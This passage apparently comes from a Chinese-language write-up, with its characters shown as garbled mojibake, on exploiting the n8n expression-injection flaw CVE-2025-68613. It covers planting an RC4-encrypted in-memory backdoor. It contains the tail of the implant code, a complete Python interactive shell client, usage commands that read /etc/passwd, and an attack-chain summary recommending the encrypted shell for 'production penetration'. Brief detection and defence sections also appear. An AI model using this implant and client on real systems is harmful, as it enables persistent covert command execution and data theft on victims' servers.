                return originalHandler.call(this, req, res);
            };

            return JSON.stringify({
                success: true,
                message: 'RC4 encrypted backdoor installed',
                endpoints: {
                    simple: 'GET /api/status?cmd=whoami',
                    encrypted: 'POST /api/status with RC4',
                    test: 'GET /api/status'
                },
                key: '3c6e0b8a9c15224a'
            }, null, 2);

        } catch(err) {
            return JSON.stringify({
                success: false,
                error: err.message,
                stack: err.stack
            });
        }
    })()
}}
```


### **4.2 æ¤å…¥æ­¥éª¤**

1. **åœ¨n8nå·¥ä½œæµä¸­æ‰§è¡Œä¸Šè¿°POC**

**æˆåŠŸè¾“å‡º**:


```text
{
  "success": true,
  "message": "RC4 encrypted backdoor installed",
  "endpoints": {
    "simple": "GET /api/status?cmd=whoami",
    "encrypted": "POST /api/status with RC4",
    "test": "GET /api/status"
  },
  "key": "3c6e0b8a9c15224a"
}
```

1. **æµ‹è¯•GETæ–¹å¼**:

```text
curl "http://localhost:5678/api/status?cmd=whoami"
```

1. **ä½¿ç”¨Pythonå®¢æˆ·ç«¯æµ‹è¯•POSTåŠ å¯†**

---


## **5. å®¢æˆ·ç«¯å·¥å…·**


### **5.1 äº¤äº’å¼Shell**


ä¿å­˜ä¸º `n8n_shell.py`:


```text
#!/usr/bin/env python3
"""n8n RC4 Encrypted Interactive Shell"""
import requests
import base64
import sys

def rc4(key, data):
    s = list(range(256))
    k = [ord(key[i % len(key)]) for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + s[i] + k[i]) % 256
        s[i], s[j] = s[j], s[i]
    i = j = 0
    o = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        o.append(b ^ s[(s[i] + s[j]) % 256])
    return bytes(o)

def exec_cmd(url, cmd, key='3c6e0b8a9c15224a'):
    encrypted = rc4(key, cmd.encode())
    r = requests.post(url, json={'data': base64.b64encode(encrypted).decode()})
    if r.status_code == 200 and r.json().get('data'):
        return rc4(key, base64.b64decode(r.json()['data'])).decode('utf-8', errors='ignore')
    return None

if __name__ == '__main__':
    url = 'http://localhost:5678/api/status'

    if len(sys.argv) > 1:
        # å•å‘½ä»¤æ¨¡å¼
        result = exec_cmd(url, ' '.join(sys.argv[1:]))
        if result:
            print(result, end='')
    else:
        # äº¤äº’æ¨¡å¼
        print('n8n Encrypted Shell v1.0')
        print('Type "exit" to quit\n')

        while True:
            try:
                cmd = input('n8n> ')
                if cmd.lower() in ['exit', 'quit']:
                    break
                if cmd.strip():
                    result = exec_cmd(url, cmd)
                    if result:
                        print(result, end='')
            except KeyboardInterrupt:
                print('\nBye!')
                break
            except Exception as e:
                print(f'Error: {e}')
```


### **5.2 ä½¿ç”¨æ–¹æ³•**


```text
# èµ‹äºˆæ‰§è¡Œæƒé™
chmod +x n8n_shell.py

# äº¤äº’æ¨¡å¼
./n8n_shell.py

# å•å‘½ä»¤æ¨¡å¼
./n8n_shell.py whoami
./n8n_shell.py "ls -la /"
./n8n_shell.py "cat /etc/passwd"
```


---


## **6. æ£€æµ‹ä¸é˜²å¾¡**


### **6.1 æ£€æµ‹å†…å­˜é©¬**


åœ¨n8nä¸­æ‰§è¡Œæ£€æµ‹ä»£ç ï¼š


```text
{{
    (function() {
        var info = {
            backdoorDetected: false,
            details: []
        };

        // æ£€æŸ¥globalå¯¹è±¡
        if (global.ge0b8a) {
            info.backdoorDetected = true;
            info.details.push('Found global.ge0b8a payload');
        }

        // æ£€æŸ¥HTTPæœåŠ¡å™¨
        if (this.process._getActiveHandles) {
            var handles = this.process._getActiveHandles();
            for (var i = 0; i < handles.length; i++) {
                var h = handles[i];
                if (h && h._events && h._events.request) {
                    var handler = h._events.request.toString();
                    if (handler.indexOf('api/status') > -1 ||
                        handler.indexOf('rc4') > -1 ||
                        handler.indexOf('execSync') > -1) {
                        info.backdoorDetected = true;
                        info.details.push('Suspicious HTTP request handler detected');
                    }
                    break;
                }
            }
        }

        return JSON.stringify(info, null, 2);
    })()
}}
```


### **6.2 æ¸…é™¤å†…å­˜é©¬**


**æ–¹æ³•1**: é‡å¯è¿›ç¨‹


```text
docker restart n8n
```


**æ–¹æ³•2**: ä»£ç æ¸…é™¤ï¼ˆå¦‚æœå¯èƒ½ï¼‰


```text
{{
    (function() {
        // åˆ é™¤global payload
        if (global.ge0b8a) {
            delete global.ge0b8a;
        }

        return 'Memory shell removed (requires process restart for full cleanup)';
    })()
}}
```


### **6.3 é˜²å¾¡å»ºè®®**


### **ç«‹å³æªæ–½**

1. **å‡çº§åˆ° n8n >= v1.122.0**
2. **è®¾ç½®ç¯å¢ƒå˜é‡**:

	```text
	export N8N_BLOCK_ENV_ACCESS_IN_NODE=true
	```

3. **é™åˆ¶å·¥ä½œæµåˆ›å»ºæƒé™**
4. **å¯ç”¨å®¡è®¡æ—¥å¿—**

### **é•¿æœŸæªæ–½**

1. **éƒ¨ç½²WAF/RASP**
2. **å®¹å™¨åŒ–éš”ç¦»**
3. **å®šæœŸå®‰å…¨å®¡è®¡**
4. **ç›‘æ§å¼‚å¸¸HTTPè·¯ç”±**

---


## **7. æ€»ç»“**


### **7.1 æ”»å‡»é“¾æ€»è§ˆ**


```text
CVE-2025-68613 RCE
        â†“
åŸºç¡€å‘½ä»¤æ‰§è¡Œ
        â†“
HTTPæœåŠ¡å™¨åŠ«æŒ
        â†“
ç®€å•Webåé—¨
        â†“
RC4åŠ å¯†é€šä¿¡
        â†“
ä¼ä¸šçº§å†…å­˜é©¬
```


### **7.2 ç‰¹æ€§å¯¹æ¯”**


| **ç‰¹æ€§** | **åŸºç¡€ç‰ˆ** | **åŠ å¯†ç‰ˆ**    |
| ------ | ------- | ---------- |
| é€šä¿¡åŠ å¯†   | âŒ       | âœ… RC4      |
| ç¼–ç æ–¹å¼   | æ˜æ–‡      | Base64     |
| è®¿é—®æ–¹å¼   | GET     | GET + POST |
| éšè”½æ€§    | â­â­â­     | â­â­â­â­â­      |
| ä½¿ç”¨å¤æ‚åº¦  | ä½       | ä¸­          |
| æ£€æµ‹éš¾åº¦   | ä¸­       | é«˜          |
| æ¨èåœºæ™¯   | å¿«é€Ÿæµ‹è¯•    | ç”Ÿäº§æ¸—é€       |


---


## **8. å¿«é€Ÿå‚è€ƒ**


### **8.1 éƒ¨ç½²æµç¨‹**


```text
# 1. åœ¨n8nä¸­æ‰§è¡ŒPOCï¼ˆåŸºç¡€æˆ–é«˜çº§ï¼‰
# 2. æµ‹è¯•GETæ–¹å¼
curl "http://localhost:5678/api/status?cmd=whoami"

# 3. ä½¿ç”¨Pythonå®¢æˆ·ç«¯ï¼ˆåŠ å¯†ç‰ˆï¼‰
python3 n8n_shell.py
```


### **8.2 å¸¸ç”¨å‘½ä»¤**


```text
# ç³»ç»Ÿä¿¡æ¯
whoami
id
uname -a

# æ–‡ä»¶æ“ä½œ
pwd
ls -la
cat /etc/passwd

# ç½‘ç»œ
ifconfig
netstat -tulnp

# è¿›ç¨‹
ps aux
```


### **8.3 æ•…éšœæ’é™¤**


| **é—®é¢˜**           | **è§£å†³æ–¹æ¡ˆ**                      |
| ---------------- | ----------------------------- |
| Constructoré”™è¯¯    | é¿å…ä½¿ç”¨ `.constructor`           |
| POST 404         | æ£€æŸ¥URLè·¯å¾„å’Œbodyè§£æ                |
| Buffer undefined | æ·»åŠ  `require('buffer').Buffer` |
| è¿”å›null           | æ£€æŸ¥åŠ å¯†keyå’Œæ•°æ®æ ¼å¼                  |


---


## **é™„å½•**


### **å‚è€ƒèµ„æº**

- [**https://www.resecurity.com/jp/blog/article/cve-2025-68613-remote-code-execution-via-expression-injection-in-n8n-2**](https://www.resecurity.com/jp/blog/article/cve-2025-68613-remote-code-execution-via-expression-injection-in-n8n-2)
- CVE-2025-68613 n8n è¡¨è¾¾å¼æ³¨å…¥ RCE æ¼æ´å®Œæ•´åˆ†æ- [**https://github.com/intbjw/CVE-2025-68613-poc-via-copilot**](https://github.com/intbjw/CVE-2025-68613-poc-via-copilot)
- n8nå®˜æ–¹æ–‡æ¡£
- RC4ç®—æ³•å®ç°
- Node.js HTTPæ¨¡å—æ–‡æ¡£
